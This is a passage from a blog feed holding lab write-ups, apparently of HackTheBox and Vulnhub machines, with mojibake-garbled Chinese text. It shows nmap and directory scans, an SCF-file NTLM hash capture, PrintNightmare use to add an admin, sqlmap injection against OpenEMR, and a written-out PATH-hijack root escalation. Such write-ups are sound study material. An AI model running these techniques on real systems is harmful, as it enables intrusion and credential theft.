<h3 id="ç¬¬äºŒç§æ–¹æ³•"><a href="#ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³•"></a>ç¬¬äºŒç§æ–¹æ³•</h3><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡MSFç¨‹åºè·å–ç›®æ ‡ä¸»æœºçš„shellï¼Œå¹¶è®¾ç½®å¯¹åº”çš„å‚æ•°é¡¹<br><img src="https://img-blog.csdnimg.cn/a0817ecc48414e04ba28a8126f1f05a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæç¤ºè¿™ä¸ªpayloadè¿è¡Œé”™è¯¯ï¼ŒåŸå› æ˜¯ä¸»æœºå¹¶ä¸æ˜¯32ä½çš„ï¼Œæ˜¯64ä½çš„<br><img src="https://img-blog.csdnimg.cn/c9995cd3ea9b4b509c347aa0508635b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŠŠå‚æ•°è®¾ç½®ä¸º64ä½å†è¿è¡Œå³å¯<br><img src="https://img-blog.csdnimg.cn/5ab52ced97f449338a1cd14d20707741.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/0950beedec5c4b9894654396d09fd96c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬å°†<code>linpeas.sh</code>è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šå¹¶è¿è¡Œå®ƒ<br><img src="https://img-blog.csdnimg.cn/ace832b109ac4ca391a07343bc66a62b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªå¯ç–‘çš„è¿›ç¨‹æ˜¯å¯èƒ½å­˜åœ¨æ¼æ´åˆ©ç”¨çš„<br><img src="https://img-blog.csdnimg.cn/9219d9c4acde429db32f97840917256e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨pspyç¨‹åºç›‘å¬ä¸€ä¸‹ä¸»æœºçš„è¿›ç¨‹<br><img src="https://img-blog.csdnimg.cn/a2824fa9dada431e948761bc432f95f6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°è¿™ä¸ªè¿›ç¨‹æ˜¯æ¯ä¼‘çœ ä¸€æ®µæ—¶é—´å°±ä¼šå†æ¬¡è¿è¡Œï¼Œå¹¶ä¸”éƒ½æ˜¯ä»¥rootèº«ä»½æ¥è¿è¡Œçš„<br><img src="https://img-blog.csdnimg.cn/597c98a3121744a98ac64e76c51564aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç°åœ¨ä½¿ç”¨çš„ç»ˆç«¯æ˜¯dumb<br><img src="https://img-blog.csdnimg.cn/9e65175ae79346ecb3631d670afba0e1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¦å°†å…¶è®¾ç½®ä¸ºxtermç»ˆç«¯<br><img src="https://img-blog.csdnimg.cn/eab51c482a6c47ef9827e3de470b933f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæŸ¥çœ‹screençš„å¸®åŠ©å‘½ä»¤å‘ç°ï¼Œ-xå‚æ•°å¯ä»¥å¸®æˆ‘ä»¬ç›´æ¥è¿›å…¥å¦ä¸€ä¸ªç»ˆç«¯ç•Œé¢ï¼Œå› ä¸ºscreenç¨‹åºæ˜¯ä»¥rootèº«ä»½è¿è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½ç›´æ¥è¿›å…¥rootç»ˆç«¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -x root/root</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/c8e276d5bacf4eeba50d6692a9160185.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Driver</title>
    <url>/2022/01/01/Driver/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†webæœåŠ¡å’ŒSMBæœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop]</span><br><span class="line">â””â”€# bash nmap.sh 10.10.11.106                                                                                                                 1 âš™</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-01 02:43 EST</span><br><span class="line">Nmap scan report for 10.10.11.106</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80&#x2F;tcp   open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP&#x2F;1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm&#x3D;MFP Firmware Update Center. Please enter password for admin</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">135&#x2F;tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">5985&#x2F;tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-01-01T14:43:35</span><br><span class="line">|_  start_date: 2022-01-01T14:37:37</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 53.61 seconds</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è®¿é—®webæœåŠ¡æ—¶ï¼Œæç¤ºæˆ‘ä»¬è¦è¾“å…¥è´¦å·å’Œå¯†ç ï¼Œæˆ‘ä»¬ä½¿ç”¨admin/adminç™»å½•æˆåŠŸ</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/c4d2b8fafacf4a7e83de610beea75a59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç™»å½•é¡µé¢æ—¶å‘ç°æ˜¯å°æ‰“å°æœºï¼Œæˆ‘ä»¬ç‚¹å‡»<code>Fireware Updates</code>é¡µé¢ï¼Œå‘ç°ç±»ä¼¼æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢<br><img src="https://img-blog.csdnimg.cn/2e214c05a4a54abcba4a54c4b911d11f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><!--more-->

<p>æˆ‘å°è¯•äº†å¾ˆä¹…çš„æ–‡ä»¶ä¸Šäº§webshelléƒ½æ²¡æœ‰æˆåŠŸï¼Œåˆ‡æ¢æ€è·¯ï¼Œæ—¢ç„¶ç›®æ ‡ä¸»æœºå¼€æ”¾äº†445ç«¯å£å’Œå…±äº«SMBæœåŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨SCFæ–‡ä»¶æ”»å‡»(è™½ç„¶è¿™ç§æ”»å‡»æ–¹å¼å¾ˆä¸å¸¸è§)ã€‚æˆ‘ä»¬é¦–å…ˆå…ˆæ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªscfæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/5d503addbbcf4fd683f0a1c02274294e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå¯åŠ¨responderç¨‹åºè¿›è¡Œç›‘å¬<br><img src="https://img-blog.csdnimg.cn/c906af81139e4e569a4ca96169bb3d3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä¸Šä¼ æˆ‘ä»¬å†™çš„shell.scfæ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸåä¼šå‡ºç°ä¸€ä¸ªtonyç”¨æˆ·çš„å“ˆå¸Œå€¼ï¼ŒåŠ å¯†çš„æ–¹å¼æ˜¯<code>NTLMv2</code><br><img src="https://img-blog.csdnimg.cn/4b75787e99934dc8986ba6a5d124e686.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨hashcatå¯¹è¿™ä¸ªå“ˆå¸Œå€¼è¿›è¡Œç ´è§£ï¼Œç ´è§£å¾—åˆ°çš„å¯†ç æ˜¯<code>liltony</code><br><img src="https://img-blog.csdnimg.cn/b4ae03ebc9e441cb81c41063bde7d8f7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªè´¦å·å¯†ç è¿›è¡Œç™»å½•ï¼Œå¾—åˆ°äº†æ™®é€šç”¨æˆ·çš„æƒé™<br><img src="https://img-blog.csdnimg.cn/ac151987bd374eeb9178da89785bfe70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŸ¥çœ‹åˆ°å­˜åœ¨<code>spoolsv</code>è¿™ä¸ªè¿›ç¨‹ï¼Œè¿™æ˜¯ä¸€ä¸ª<code>Windows Print Spooler</code>æœåŠ¡ï¼Œå­˜åœ¨ä¸€ä¸ªCVEæ¼æ´ç¼–å·ï¼Œå¯¹åº”çš„CVEç¼–å·æ˜¯<code>CVE-2021-1675</code><br><img src="https://img-blog.csdnimg.cn/235805f980cf43c68a8fc68310f5bcf3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºä¸Šè¿œç¨‹åŠ è½½æˆ‘ä»¬çš„powershellè„šæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨è„šæœ¬åˆ›å»ºä¸€ä¸ªåŒ¿å±ç®¡ç†å‘˜ç»„çš„ç”¨æˆ·<br><img src="https://img-blog.csdnimg.cn/1b8333a9b0734baabe95425606940b95.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ·»åŠ æˆåŠŸåï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªè´¦æˆ·å¯†ç è¿›è¡Œç™»å½•äº†ï¼Œæƒé™æ˜¯ç®¡ç†å‘˜æƒé™<br><img src="https://img-blog.csdnimg.cn/a778b21f88954011b0a534250f909205.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>Windows Print Spooler</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Healthcare</title>
    <url>/2021/12/26/Healthcare/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†ftpå’ŒwebæœåŠ¡ï¼Œå¹¶ä¸”æ‰«æå‡ºäº†ä¸å…è®¸è®¿é—®çš„å‡ ä¸ªç›®å½•<br><img src="https://img-blog.csdnimg.cn/5dbfa03fea4c49f1a2b08c27a605fbcc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åˆ†åˆ«è®¿é—®è¿™å‡ ä¸ªç›®å½•ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªç›®å½•å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œå…¶ä»–ç›®å½•éƒ½æ˜¾ç¤º404çŠ¶æ€ç <br><img src="https://img-blog.csdnimg.cn/856663a863cd441ca9ca6d8e62e83129.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/d0a8cae2057141059254c7688269f92c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æ²¡å‘ç°ä»»ä½•æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±fuzzä¸€ä¸‹è·¯å¾„å§ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªopenemrè·¯å¾„ï¼Œè¿›å…¥åå‘ç°æ˜¯åå°ç™»å½•é¡µé¢</p>
<span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u &quot;http:&#x2F;&#x2F;192.168.101.200&quot; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-big.txt -e 404,403,500</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/62eb523aa913490cb9772221e6da1687.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/ffb2f3248388447cbbbb28ff1fe1f4fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>çœ‹åˆ°postè¡¨å•ï¼Œæ¡ä»¶åå°„éªŒè¯æ˜¯å¤Ÿå­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œä½¿ç”¨burpsuiteæŠ“åŒ…å¹¶ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/9fc387f225fb434d9189cf499ec9fd96.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯¹æ•°æ®åº“è¿›è¡Œæ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/b71794267f1340b2bd79b21e04a19913.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹å­˜åœ¨usersè¡¨<br><img src="https://img-blog.csdnimg.cn/786a517b4ae94a70998658329530e0ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>å‘ç°usersè¡¨é‡Œå­˜åœ¨usernameå’Œpasswordä¸¤ä¸ªå­—æ®µ<br><img src="https://img-blog.csdnimg.cn/3ad57acd36ea44a6965f90f1200a4b83.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨å…¥å‘ç°äº†ä¸¤ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œæˆ‘ä»¬åˆ†åˆ«å°è¯•ç™»å½•ftpï¼Œå‘ç°ä½¿ç”¨medicalè´¦å·å¯ä»¥ç™»å½•æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/5f4e0f07bb7540f4b112b1c1d3b46062.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/d996972aacfe4e6f8988bca089b13a40.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†payloadä¸Šä¼ åˆ°<code>/var/www/html/openemr</code>ç›®å½•ä¸­ï¼Œå¹¶è¿›è¡Œè®¿é—®<br><img src="https://img-blog.csdnimg.cn/8b9e1beafa41414a8d24428ffd10e758.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬åˆ‡æ¢åˆ°medicalç”¨æˆ·ä¸Šï¼Œå¹¶æŸ¥æ‰¾å¯ä»¥æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶<code>find / -perm -4000 2&gt;/dev/null</code><br><img src="https://img-blog.csdnimg.cn/38be5967b2204505b7abd5d0fbb30704.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°<code>/usr/bin/healthcheck</code>æ–‡ä»¶æ˜¯æ¯”è¾ƒå®¹æ˜“å—åˆ°æ”»å‡»çš„ç¨‹åºï¼Œå®ƒåªæ˜¯è¿è¡Œäº†ä¸€å †æ ‡å‡†çš„linuxç¨‹åºï¼Œæ¯”è¾ƒæ˜æ˜¾çš„æ˜¯<code>fdisk -l</code>è¿™ä¸ªç¨‹åº<br><img src="https://img-blog.csdnimg.cn/53728f3d36a841d1a02a990f9a6c58c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¾“å…¥ä»¥ä¸‹å¸¸è§çš„ææƒæ“ä½œï¼Œå…ˆå°†/bin/bashå‘½ä»¤å†™å…¥åˆ°fdiskç¨‹åºä¸­ï¼Œå¹¶å°†å…¶å¯¼å…¥åˆ°medicalç”¨æˆ·çš„æ‰§è¡Œè·¯å¾„ä¸­ï¼Œæ·»åŠ æ‰§è¡Œæƒé™å¹¶æ‹¿å–rootæƒé™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; fdisk</span><br><span class="line">chmod +x fdisk</span><br><span class="line">export PATH&#x3D;&#x2F;home&#x2F;medical:$PATH</span><br><span class="line">echo $PATH</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;healthcheck</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/cda20fb3c5914ceaa4d13a6d3a7adf62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>SQLæ³¨å…¥æ¼æ´</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomato</title>
    <url>/2021/12/24/Tomato/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>è¿è¡Œæˆ‘ä»¬çš„bashè„šæœ¬ï¼Œå‘ç°ç›®æ ‡ç³»ç»Ÿå¼€æ”¾äº†ftpå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/b2f1b07f20b74e8cbbf09d8aceb93286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•æ˜¯å¦å¯ä»¥åŒ¿åç™»å½•ftpï¼Œæœªæœ<br><img src="https://img-blog.csdnimg.cn/074a7cd93bf64ed3aa33a1e7ba57281e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬è®¿é—®webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç•ªèŒ„å›¾ç‰‡ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡ä»€ä¹ˆå‘ç°</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/6fbb54145b634516a076f26d15d098ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬fuzzä¸€ä¸‹è·¯å¾„ï¼Œå‘ç°äº†å­˜åœ¨ä¸€ä¸ªantibot_imageè·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.101.197/&quot;</span> -e * -x404,500,403 -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/fa0487042a3d48909ab79d96a12532a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬å‘ç°å­˜åœ¨ä¸€ä¸ªinfo.phpæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/a59aa7bf23b2400cb4fd41b01cea33d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–‡ä»¶çš„æºç æç¤ºæˆ‘ä»¬å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´<br><img src="https://img-blog.csdnimg.cn/39d170ef77ee482988bbfd4d37ecc20b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬éªŒè¯æ¼æ´ç¡®å®æ˜¯çœŸå®å­˜åœ¨çš„<br><img src="https://img-blog.csdnimg.cn/b6bee6c21fc2499999963c8682e6f3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
